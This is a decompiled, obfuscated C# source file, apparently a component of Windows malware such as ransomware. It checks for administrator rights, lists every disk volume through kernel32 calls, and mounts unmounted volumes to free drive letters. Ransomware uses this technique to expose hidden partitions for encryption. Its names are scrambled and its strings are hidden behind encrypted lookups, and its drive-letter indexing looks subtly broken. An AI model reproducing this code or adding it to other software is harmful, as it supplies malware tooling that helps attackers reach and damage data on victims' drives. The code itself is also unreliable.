using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nVxbvhuaKzC;

public static class GlqyOrJeynl
{
	public enum EQsCkRDoHIKt : uint
	{
		OxkNTtUAZaS,
		RUkVBMFQfPSD,
		FqpSdljVeUWQtY,
		pWoQxjLbngAj,
		afTeXAyeSzlx,
		UjqHdDgQUnjJ,
		MBqvbfzRxooLrAhf
	}

	private sealed class NLuaWJntARmABZEC
	{
		public uint NnIneJWtKQC;

		public uint oSHXSILeIqU;

		public char[] WYnDoQGVHfpL;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			return !GetVolumePathNamesForVolumeNameW(string_0, WYnDoQGVHfpL, oSHXSILeIqU, ref NnIneJWtKQC) || WYnDoQGVHfpL.Length != 3;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern EQsCkRDoHIKt GetDriveType([MarshalAs(UnmanagedType.LPStr)] string kKJIsYQocgKzecbL);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string ZDujGBgAlBWTC, char[] XJqrskrCid, uint BiMRhIgahsSF, ref uint XUvOmPEUIhMOSk);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> vzcYIUZKAwAoS()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void yeMlISZRhWHMLW()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			NLuaWJntARmABZEC CS_0024_003C_003E8__locals0 = new NLuaWJntARmABZEC();
			string[] array = new string[26]
			{
				getString_0(107405386),
				getString_0(107405381),
				getString_0(107405376),
				getString_0(107405403),
				getString_0(107405398),
				getString_0(107405393),
				getString_0(107404844),
				getString_0(107404839),
				getString_0(107404834),
				getString_0(107404861),
				getString_0(107404856),
				getString_0(107404851),
				getString_0(107404814),
				getString_0(107404809),
				getString_0(107404804),
				getString_0(107404799),
				getString_0(107404826),
				getString_0(107404821),
				getString_0(107404816),
				getString_0(107404779),
				getString_0(107404774),
				getString_0(107404769),
				getString_0(107404796),
				getString_0(107404791),
				getString_0(107404786),
				getString_0(107404749)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == EQsCkRDoHIKt.RUkVBMFQfPSD)
				{
					array2[num++] = text;
				}
			}
			List<string> source = vzcYIUZKAwAoS();
			CS_0024_003C_003E8__locals0.NnIneJWtKQC = 0u;
			CS_0024_003C_003E8__locals0.oSHXSILeIqU = 120u;
			CS_0024_003C_003E8__locals0.WYnDoQGVHfpL = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.WYnDoQGVHfpL, CS_0024_003C_003E8__locals0.oSHXSILeIqU, ref CS_0024_003C_003E8__locals0.NnIneJWtKQC) || CS_0024_003C_003E8__locals0.WYnDoQGVHfpL.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (FcnBvlzKWyQDwH.DHKhstFrxWX)
				{
					try
					{
						Console.WriteLine(getString_0(107404744), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (FcnBvlzKWyQDwH.IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(FcnBvlzKWyQDwH.AJzDKHoaGNRf, getString_0(107404751) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static GlqyOrJeynl()
	{
		Strings.CreateGetStringDelegate(typeof(GlqyOrJeynl));
	}
}
